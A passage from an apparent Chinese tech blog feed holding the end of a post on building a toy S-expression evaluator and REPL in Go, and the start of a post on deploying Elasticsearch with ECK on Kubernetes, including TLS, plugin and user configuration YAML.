&lt;span class="k">if&lt;/span> &lt;span class="nx">val&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">ee&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">LookupLocalName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">val&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">val&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">ee&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">parent&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">LookupName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ee&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">ExecutionEnv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">LookupLocalName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">Value&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">val&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">ee&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">name&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">val&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="求值">求值&lt;/h3>
&lt;p>语言定义里（不是 scheme 的语言定义，那个去参考 r4rs/r5rs/r6rs/r7rs，这里指的是我给这个玩具求值器的语言定义），&lt;code>(a b c)&lt;/code> 这样的列表等于是 &lt;code>a(b, c)&lt;/code> 这样的函数调用，而原始列表得写成 &lt;code>#(a b c)&lt;/code>，可以理解成告诉求值器要把给出的表达式当成数据还是代码。&lt;/p>
&lt;p>类似的还有&lt;code>ident&lt;/code>会被求值，在执行环境里寻找对应的变量；&lt;code>#ident&lt;/code> 求值结果就是标识符&lt;code>ident&lt;/code>。&lt;/p>
&lt;p>求值过程就是简单的做个 type switch，字面量不管，原始列表和标识符返回内容，再然后就是列表当成函数求值。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ee&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">ExecutionEnv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">EvaluateList&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">list&lt;/span> &lt;span class="nx">List&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Value&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">list&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">first&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">ee&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Evaluate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">list&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">])&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">fn&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">first&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="nx">BuiltinFunc&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">ok&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Errorf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;TypeError: %v(%T) is not callable&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">first&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">first&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">args&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">([]&lt;/span>&lt;span class="nx">Value&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">list&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">:]))&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">v&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">list&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">:]&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">arg&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">ee&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Evaluate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">args&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">args&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">arg&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nf">fn&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ee&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">args&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ee&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">ExecutionEnv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Evaluate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">val&lt;/span> &lt;span class="nx">Value&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Value&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="nx">v&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">val&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="kd">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">List&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">ee&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">EvaluateList&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nx">Identifier&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">ee&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">LookupName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">)),&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Quoted&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">v&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">GetValue&lt;/span>&lt;span class="p">().(&lt;/span>&lt;span class="nx">Value&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">v&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>因为还没写 procdure 的定义，所以直接拿 Builtin 做了类型断言判断是不是可以调用。我寻思传参大概会是个挺麻烦的事情。&lt;/p>
&lt;h3 id="repl">REPL&lt;/h3>
&lt;p>最后就是解释器本体了，用 &lt;code>go-prompt&lt;/code> 做了个简单的循环，再加上一点算数函数。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;github.com/c-bata/go-prompt&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;github.com/nnnewb/minilang/internal/builtin&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;github.com/nnnewb/minilang/internal/environment&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;github.com/nnnewb/minilang/pkg/ast&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;github.com/nnnewb/minilang/pkg/bnf/lexer&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;github.com/nnnewb/minilang/pkg/bnf/parser&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">input&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">prompt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Input&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">d&lt;/span> &lt;span class="nx">prompt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Document&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">prompt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Suggest&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">prompt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Suggest&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="p">})&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">input&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s">&amp;#34;.quit&amp;#34;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">break&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">ee&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">environment&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewExecutionEnv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">nil&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">builtin&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RegisterArithmeticBuiltin&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ee&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">ee&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SetValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;display&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">environment&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">BuiltinFunc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ee&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">environment&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ExecutionEnv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">args&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="nx">environment&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Value&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">environment&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Value&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">v&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">args&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%v&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">v&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nb">println&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}))&lt;/span>
&lt;span class="nx">lexer&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">lexer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewLexer&lt;/span>&lt;span class="p">([]&lt;/span>&lt;span class="nb">byte&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">input&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="nx">parser&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">parser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewParser&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">parseResult&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">parser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Parse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">lexer&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;parse error %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">continue&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">val&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">environment&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewValueFromASTNode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">parseResult&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="nx">ast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Node&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="nx">evaluated&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">ee&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Evaluate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">val&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;evaluation failed, error %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">continue&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;# (%T) %v\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">evaluated&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">evaluated&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后执行的效果就是这样：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&amp;gt;(display &amp;#34;Hello world!&amp;#34;)
&amp;#34;Hello world!&amp;#34;
# (&amp;lt;nil&amp;gt;) &amp;lt;nil&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="总结">总结&lt;/h2>
&lt;p>s表达式求值不是什么大不了的东西，但 Lisp/Scheme 中体现出的那种 “代码即数据” 的思想还是很有意思的，甚至是很有想象力的。&lt;/p>
&lt;p>不管是命令式语言还是函数式语言，代码和数据都是被分开讨论的。“代码”处理“数据”，放在 Lisp 家族里就是 “代码”处理“代码”，有没有联想到 AI ？&lt;/p>
&lt;p>好吧，毕竟是上世纪的古董了，现在说起 AI 都是 Python 和神经网络。但不管怎么说吧，Lisp/Scheme 还是挺好玩的对吧？没事可以上 &lt;a class="link" href="https://racket-lang.org/" target="_blank" rel="noopener"
>Racket&lt;/a> 官网看看，说不定会喜欢上 Lisp 的奇妙之处呢。&lt;/p></description></item><item><title>简单的ECK部署</title><link>https://nnnewb.github.io/blog/p/simple-eck-cluster-deployment/</link><pubDate>Tue, 30 Nov 2021 11:13:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/simple-eck-cluster-deployment/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>因为工作需要，得在自己搭建的集群里部署一个 Elasticsearch 。又因为是云端的集群，在 k8s 外用 docker 单独起一个 ES 明显更难维护（但部署更简单），于是选择用 ECK 。&lt;/p>
&lt;p>ECK 就是 Elastic Cloud on Kubernetes 的缩写，可以理解成部署在 Kubernetes 上的 Elasticsearch 。当然不止 ES 。&lt;/p>
&lt;p>部署 ES 的过程遇到几个问题记录下怎么解决的。&lt;/p>
&lt;ol>
&lt;li>ES 使用自签名证书，导致 HTTP 不能连接。&lt;/li>
&lt;li>ECK 需要安装 IK 分词插件。&lt;/li>
&lt;li>ECK 默认密码每次部署都重新生成，而且默认用户权限过大。&lt;/li>
&lt;li>ECK 默认没配 PVC ，数据没有持久化。&lt;/li>
&lt;/ol>
&lt;p>接下来逐个解决。&lt;/p>
&lt;h2 id="0x01-自签名证书">0x01 自签名证书&lt;/h2>
&lt;p>自签名证书解决方法有几个&lt;/p>
&lt;ol>
&lt;li>改客户端，让客户端用自签名证书连接。很麻烦。&lt;/li>
&lt;li>生成一个固定的证书，让ES和客户端都用这个证书，客户端和ES都要改。很麻烦。&lt;/li>
&lt;li>禁用 ES 的自签名证书。&lt;/li>
&lt;/ol>
&lt;p>考虑到是私有的测试环境，不搞这些烦人的东西，直接禁用。&lt;/p>
&lt;p>修改 YAML 如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">apiVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">elasticsearch.k8s.elastic.co/v1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Elasticsearch&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">elasticsearch&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">tls&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">selfSignedCertificate&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">disabled&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意 &lt;code>spec.http.tls.selfSignedCertificate.disabled&lt;/code> 这个字段。&lt;/p>
&lt;p>参考文档：&lt;a class="link" href="https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-tls-certificates.html" target="_blank" rel="noopener"
>Orchestrating Elastic Stack applications - Access Elastic Stack services - TLS certificates&lt;/a>&lt;/p>
&lt;h2 id="0x02-安装-ik-分词组件">0x02 安装 IK 分词组件&lt;/h2>
&lt;p>官方文档提供的安装插件思路是利用 initContainer 。参考文档：&lt;a class="link" href="https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-init-containers-plugin-downloads.html" target="_blank" rel="noopener"
>init containers for plugin downloads&lt;/a> 。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">nodeSets&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">default&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">count&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">3&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">podTemplate&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">initContainers&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">install-plugins&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">command&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">sh&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- -&lt;span class="l">c&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="p">|&lt;/span>&lt;span class="sd">
&lt;/span>&lt;span class="sd"> &lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">bin/elasticsearch-plugin install --batch repository-gcs&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>initContainer 容器默认会继承自下面的内容：&lt;/p>
&lt;ul>
&lt;li>没有另外指定的情况下，继承主容器的镜像(我的例子中，就是 &lt;code>Elasticsearch:7.9.1&lt;/code>)&lt;/li>
&lt;li>主容器的 volume 挂载，如果 initContainer 有同名同路径的 volume 则优先用 initContainer 的。&lt;/li>
&lt;li>POD 名称和 IP 。&lt;/li>
&lt;/ul>
&lt;h2 id="0x03-添加自定义用户">0x03 添加自定义用户&lt;/h2>
&lt;p>有好几种方式：&lt;/p>
&lt;ol>
&lt;li>官方文档中的方法：&lt;a class="link" href="https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-users-and-roles.html" target="_blank" rel="noopener"
>k8s users and roles&lt;/a>，比较稳定，但还是挺麻烦的。&lt;/li>
&lt;li>修改 &lt;code>[es-cluster-name]-es-elastic-user&lt;/code> 这个 &lt;code>secret&lt;/code>，好处是简单，但要求必须先创建 secret 再创建 ES ，单个 YAML 去 &lt;code>create -f&lt;/code> 的情况下不友好。&lt;/li>
&lt;li>基于第2节中利用 initContainer 的做法和官方文档里提到的 &lt;code>elasticsearch-users&lt;/code> 命令行工具，直接在 initContainer 里创建指定用户名密码的用户。不确定这个做法会不会在多节点 ECK 里出问题，毕竟这等于是每个节点都创建了一次用户。不过我只需要单节点，所以也还过得去。&lt;/li>
&lt;/ol>
&lt;p>最终决定用第 3 种方法，因为做一个单节点集群简单不费事，多节点的话，目前开的服务器配置也吃不消。（其实是搞完才仔细读文档，第 1 种方法其实也不算太麻烦&amp;hellip;）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">nodeSets&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">default&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">count&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">3&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">podTemplate&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">initContainers&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
